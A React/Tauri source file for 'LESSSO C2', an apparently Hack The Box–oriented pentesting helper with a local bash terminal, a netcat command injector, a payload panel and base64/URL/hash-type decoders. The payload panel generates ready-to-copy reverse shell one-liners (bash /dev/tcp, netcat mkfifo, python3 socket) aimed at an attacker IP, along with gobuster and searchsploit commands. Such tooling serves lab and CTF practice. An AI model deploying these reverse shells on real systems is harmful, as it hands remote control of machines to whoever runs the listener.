import { useState, useEffect, useRef } from 'react'
import { invoke } from '@tauri-apps/api/core'
import { listen } from '@tauri-apps/api/event'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import '@xterm/xterm/css/xterm.css'

export function NetcatTool() {
  const [ncMode, setNcMode] = useState<'listen' | 'connect'>('listen')
  const [ncIp, setNcIp] = useState('')
  const [ncPort, setNcPort] = useState('4444')
  const [ncUdp, setNcUdp] = useState(false)
  const [ncNoDns, setNcNoDns] = useState(true) 
  const [ncVerbose, setNcVerbose] = useState(true) 
  
  const [isActive, setIsActive] = useState(false);
  const [sessionId, setSessionId] = useState('');
  
  const termRef = useRef<HTMLDivElement>(null);
  const terminalInstance = useRef<Terminal | null>(null);
  const unlistenFuncs = useRef<Array<() => void>>([]);

  const stopTerminal = async () => {
    if (sessionId) {
      await invoke('kill_terminal', { sessionId });
      terminalInstance.current?.writeln('\r\n\x1b[1;31m[!] Sesión local terminada.\x1b[0m');
    }
    setIsActive(false);
  }

  const startTerminal = async () => {
    const sid = Date.now().toString();
    setSessionId(sid);
    setIsActive(true);

    setTimeout(async () => {
      if (!termRef.current) return;
      termRef.current.innerHTML = ''; 
      const term = new Terminal({
        theme: { background: '#0b1120', foreground: '#34d399', cursor: '#34d399' },
        fontSize: 13, fontFamily: 'monospace', cursorBlink: true
      });
      const fitAddon = new FitAddon();
      term.loadAddon(fitAddon);
      term.open(termRef.current);
      fitAddon.fit();
      terminalInstance.current = term;

      term.writeln('\x1b[1;36m[*] LESSSO C2 - Inicializando Terminal Local (Bash)...\x1b[0m');

      const unlistenOut = await listen<string>(`term-output-${sid}`, (e) => {
        const formatted = e.payload.replace(/\n/g, '\r\n');
        term.write(formatted);
      });
      
      const unlistenExit = await listen(`term-exit-${sid}`, () => {
        term.writeln('\r\n\x1b[1;33m[*] Proceso finalizado.\x1b[0m');
        setIsActive(false);
      });

      unlistenFuncs.current.push(unlistenOut, unlistenExit);

      term.onData(data => {
        invoke('write_terminal', { sessionId: sid, data }).catch(() => {});
      });

      try {
        await invoke('start_terminal', { sessionId: sid, cmd: '/bin/bash', args: ['-i'] });
      } catch (err) {
        term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`);
        setIsActive(false);
      }

      const resizeHandler = () => fitAddon.fit();
      window.addEventListener('resize', resizeHandler);
      unlistenFuncs.current.push(() => window.removeEventListener('resize', resizeHandler));
    }, 100);
  }

  const injectNetcatCommand = () => {
    if (!sessionId) return;
    let cmd = 'nc ';
    if (ncNoDns) cmd += '-n ';
    if (ncVerbose) cmd += '-v ';
    if (ncUdp) cmd += '-u ';
    
    if (ncMode === 'listen') {
      cmd += `-l -p ${ncPort}`;
    } else {
      cmd += `${ncIp || '<IP>'} ${ncPort}`;
    }
    
    invoke('write_terminal', { sessionId, data: cmd + '\n' }).catch(() => {});
  }

  useEffect(() => {
    return () => {
      unlistenFuncs.current.forEach(f => f());
      if (sessionId) invoke('kill_terminal', { sessionId }).catch(()=>{});
    }
  }, [sessionId]);

  return (
    <div className="flex flex-col h-full overflow-hidden p-1">
      {!isActive ? (
        <div className="flex flex-col items-center justify-center h-full text-center p-4">
          <div className="w-16 h-16 bg-indigo-100 dark:bg-indigo-900/30 text-indigo-500 rounded-full flex items-center justify-center text-3xl mb-4">🖥️</div>
          <h3 className="text-sm font-bold text-slate-700 dark:text-slate-300 mb-2">Terminal Local Inactiva</h3>
          <p className="text-[11px] text-slate-500 mb-6 max-w-sm">Inicia una sesión de Bash local. Podrás inyectar Netcat, hacer pings o usar SSH sin salir de LESSSO C2.</p>
          <button onClick={startTerminal} className="bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-2.5 px-8 rounded shadow-lg shadow-indigo-500/20 transition-all uppercase text-[11px]">
            INICIAR BASH LOCAL
          </button>
        </div>
      ) : (
        <div className="flex flex-col h-full bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
          
          <div className="bg-slate-800 p-2 border-b border-slate-700 flex flex-col gap-2 shrink-0">
            <div className="flex justify-between items-center">
               <span className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-2 tracking-wider"><span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span> BASH SESSION</span>
               <button onClick={stopTerminal} className="text-[9px] bg-red-900/50 text-red-400 hover:bg-red-500 hover:text-white px-3 py-1 rounded font-bold uppercase transition-colors tracking-widest">Terminar Shell</button>
            </div>
            
            <div className="bg-slate-900/80 p-1.5 rounded border border-slate-700 flex flex-wrap gap-2 items-center">
              <div className="flex bg-slate-800 rounded">
                <button onClick={() => setNcMode('listen')} className={`px-2 py-1 text-[9px] font-bold rounded-sm uppercase transition-colors ${ncMode === 'listen' ? 'bg-indigo-500 text-white' : 'text-slate-400'}`}>Listen</button>
                <button onClick={() => setNcMode('connect')} className={`px-2 py-1 text-[9px] font-bold rounded-sm uppercase transition-colors ${ncMode === 'connect' ? 'bg-rose-500 text-white' : 'text-slate-400'}`}>Conectar</button>
              </div>
              {ncMode === 'connect' && <input type="text" value={ncIp} onChange={e => setNcIp(e.target.value)} placeholder="IP Destino" className="w-28 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] text-white outline-none font-mono" />}
              <input type="text" value={ncPort} onChange={e => setNcPort(e.target.value)} placeholder="Puerto" className="w-20 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] font-mono text-white outline-none" />
              
              <label className="flex items-center space-x-1.5 cursor-pointer" title="Evita consultas DNS. Obligatorio si el servidor de HTB es inestable."><input type="checkbox" checked={ncNoDns} onChange={() => setNcNoDns(!ncNoDns)} className="rounded text-indigo-500 accent-indigo-500" /><span className="text-[9px] font-bold text-slate-300">-n</span></label>
              <label className="flex items-center space-x-1.5 cursor-pointer" title="Verbose"><input type="checkbox" checked={ncVerbose} onChange={() => setNcVerbose(!ncVerbose)} className="rounded text-indigo-500 accent-indigo-500" /><span className="text-[9px] font-bold text-slate-300">-v</span></label>
              
              <button onClick={injectNetcatCommand} className="ml-auto bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-1 rounded text-[9px] font-bold uppercase shadow-sm">Inyectar Netcat ↵</button>
            </div>
          </div>

          <div ref={termRef} className="flex-1 w-full h-full p-2 bg-[#0b1120] overflow-hidden" />
        </div>
      )}
    </div>
  )
}

export function PayloadsTool() {
  const [rsIp, setRsIp] = useState('10.10.14.X')
  const [rsPort, setRsPort] = useState('4444')
  const [goUrl, setGoUrl] = useState('')
  const [goWordlist, setGoWordlist] = useState('/usr/share/wordlists/dirb/common.txt')
  const [ssTerm, setSsTerm] = useState('')

  const getRevShell = (type: string) => {
    if(type === 'bash') return `bash -c 'bash -i >& /dev/tcp/${rsIp}/${rsPort} 0>&1'`;
    if(type === 'nc') return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${rsIp} ${rsPort} >/tmp/f`;
    if(type === 'python') return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${rsIp}",${rsPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("sh")'`;
    return '';
  }
  const getGobusterCmd = () => `gobuster dir -u ${goUrl || 'http://target'} -w ${goWordlist} -t 50`;
  const getSearchsploitCmd = () => `searchsploit ${ssTerm || '<software_version>'}`;

  const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado:\n${cmd}`); }

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3 space-y-6">
      <div className="space-y-3">
        <h3 className="text-[10px] tracking-widest font-black text-emerald-600 dark:text-emerald-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Reverse Shells</h3>
        <div className="flex gap-2">
          <input type="text" value={rsIp} onChange={e => setRsIp(e.target.value)} placeholder="Tu IP (VPN)" className="flex-1 px-2 py-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
          <input type="text" value={rsPort} onChange={e => setRsPort(e.target.value)} placeholder="Puerto" className="w-16 px-2 py-1 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
        </div>
        <div className="space-y-1">
          <button onClick={() => copyToClipboard(getRevShell('bash'))} className="w-full text-left px-2 py-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[10px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Bash: bash -i >& /dev/tcp/..."}</button>
          <button onClick={() => copyToClipboard(getRevShell('nc'))} className="w-full text-left px-2 py-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[10px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Netcat: mkfifo /tmp/f..."}</button>
          <button onClick={() => copyToClipboard(getRevShell('python'))} className="w-full text-left px-2 py-1.5 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[10px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Python3: import socket..."}</button>
        </div>
      </div>

      <div className="space-y-3">
        <h3 className="text-[10px] tracking-widest font-black text-orange-600 dark:text-orange-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Gobuster</h3>
        <input type="text" value={goUrl} onChange={e => setGoUrl(e.target.value)} placeholder="URL: http://target.com" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
        <select value={goWordlist} onChange={e => setGoWordlist(e.target.value)} className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none">
          <option value="/usr/share/wordlists/dirb/common.txt">dirb/common.txt</option>
          <option value="/usr/share/wordlists/dirb/big.txt">dirb/big.txt</option>
          <option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt">dirbuster/medium.txt</option>
        </select>
        <button onClick={() => copyToClipboard(getGobusterCmd())} className="w-full bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-orange-200 border border-orange-200 dark:border-orange-800/50">Copiar Comando</button>
      </div>

      <div className="space-y-3">
        <h3 className="text-[10px] tracking-widest font-black text-sky-600 dark:text-sky-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Searchsploit</h3>
        <input type="text" value={ssTerm} onChange={e => setSsTerm(e.target.value)} placeholder="Servicio: Apache 2.4.49" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
        <button onClick={() => copyToClipboard(getSearchsploitCmd())} className="w-full bg-sky-100 text-sky-700 dark:bg-sky-900/30 dark:text-sky-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-sky-200 border border-sky-200 dark:border-sky-800/50">Copiar Comando</button>
      </div>
    </div>
  )
}

export function DecodersTool() {
  const [inputText, setInputText] = useState('')
  const [outputText, setOutputText] = useState('')

  const handleDecode = (type: 'b64_encode' | 'b64_decode' | 'url_encode' | 'url_decode') => {
    try {
      if (type === 'b64_encode') setOutputText(btoa(inputText));
      if (type === 'b64_decode') setOutputText(atob(inputText));
      if (type === 'url_encode') setOutputText(encodeURIComponent(inputText));
      if (type === 'url_decode') setOutputText(decodeURIComponent(inputText));
    } catch { setOutputText('Error: Entrada inválida.'); }
  }

  const analyzeHash = () => {
    const hash = inputText.trim();
    const len = hash.length;
    let res = 'No reconocido';
    if(len === 32) res = 'MD5 (Hashcat mode: 0)';
    else if(len === 40) res = 'SHA1 (Hashcat mode: 100)';
    else if(len === 64) res = 'SHA256 (Hashcat mode: 1400)';
    else if(hash.startsWith('$1$')) res = 'MD5 Crypt (Hashcat mode: 500)';
    else if(hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) res = 'Bcrypt (Hashcat mode: 3200)';
    else if(hash.startsWith('$6$')) res = 'SHA512 Crypt (Hashcat mode: 1800)';
    
    setOutputText(`Análisis de Hash:\nLongitud: ${len}\nTipo Probable: ${res}`);
  }

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3">
      <h3 className="text-[10px] tracking-widest font-black text-fuchsia-600 dark:text-fuchsia-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1 mb-3">Decoders & Hashes</h3>
      <textarea value={inputText} onChange={(e) => setInputText(e.target.value)} placeholder="Pega un Hash, Base64 o URL Encodeada..." className="w-full h-24 p-2 text-xs bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded-md outline-none dark:text-slate-200 font-mono resize-none shrink-0 mb-3" />
      <div className="flex flex-wrap gap-2 mb-3">
        <button onClick={() => handleDecode('b64_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">B64 Enc</button>
        <button onClick={() => handleDecode('b64_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">B64 Dec</button>
        <button onClick={() => handleDecode('url_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">URL Enc</button>
        <button onClick={() => handleDecode('url_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">URL Dec</button>
      </div>
      <button onClick={analyzeHash} className="w-full mb-3 px-3 py-1.5 bg-fuchsia-100 dark:bg-fuchsia-900/50 text-fuchsia-700 dark:text-fuchsia-400 text-[11px] font-bold rounded border border-fuchsia-200 dark:border-fuchsia-800/50 hover:bg-fuchsia-200">Analizar Tipo de Hash</button>
      <textarea value={outputText} readOnly placeholder="Resultado..." className="w-full flex-1 p-2 text-[11px] bg-indigo-50 dark:bg-indigo-900/10 border border-indigo-100 dark:border-indigo-900/50 rounded-md outline-none text-indigo-900 dark:text-indigo-300 font-mono resize-none" />
    </div>
  )
}
